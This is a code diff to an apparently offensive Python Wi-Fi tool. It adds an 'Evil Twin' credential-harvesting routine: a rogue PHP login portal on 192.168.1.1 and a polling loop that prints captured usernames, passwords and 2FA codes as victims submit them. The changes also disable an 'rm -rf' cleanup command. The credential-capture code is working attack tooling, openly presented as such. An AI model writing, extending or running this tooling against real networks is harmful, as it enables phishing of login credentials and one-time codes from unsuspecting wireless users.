@@ -226,6 +226,43 @@ def check_deps():
     print(Fore.WHITE)
 
 
+""" Read file for ETwin Attack """
+
+
+def read_file():
+    with open("./ETwin-templates/login-temp/users-creds.txt", "r") as f:
+        readFile_user = f.readlines()
+    with open("./ETwin-templates/login-temp/portal_2fa/2fa.txt", "r") as f:
+        readFile_2fa = f.readlines()
+    return readFile_user, readFile_2fa
+
+
+def getCredentials():
+    initial_user, initial_2fa = read_file()
+    while True:
+        current_user, current_2fa = read_file()
+        if initial_user != current_user:
+            os.system("clear")
+            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+            print(Fore.WHITE)
+            for line in current_user:
+                print(line)
+            print(Fore.WHITE)
+            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+
+            initial_user = current_user
+
+        if initial_2fa != current_2fa:
+            os.system("clear")
+            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+            print(Fore.WHITE)
+            for line in current_2fa:
+                print(line)
+            print(Fore.WHITE)
+            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+            initial_2fa = current_2fa
+
+
 def attack_func(network_interface, attack_mode):
     time.sleep(1)
     subprocess.run(["clear"])
@@ -444,7 +481,10 @@ def attack_func(network_interface, attack_mode):
         print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Starting PHP Server...'}")
         time.sleep(3)
         print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' [!] Press CTRL+C to stop the attack.'}")
-        php_server = os.system(f"cd ETwin-templates/login-temp;xterm -hold -e sudo php -S 192.168.1.1:80")
+        php_server = os.system(f"cd ETwin-templates/login-temp;xterm -hold -e sudo php -S 192.168.1.1:80 &")
+        print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Waiting for Credentials..'}")
+        print(Fore.WHITE)
+        getCredentials()
         # Killing all the process.
         process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
         out, err = process1.communicate()
@@ -461,7 +501,7 @@ def attack_func(network_interface, attack_mode):
 def quit_program():
     time.sleep(2)
     get_colours("\n[!] Exiting the program...", "blue")
-    os.system("rm -rf Cap*")
+    # os.system("rm -rf Cap*")
     get_colours("\nSetting Network interface to it normal mode..", "mangeta")
     subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
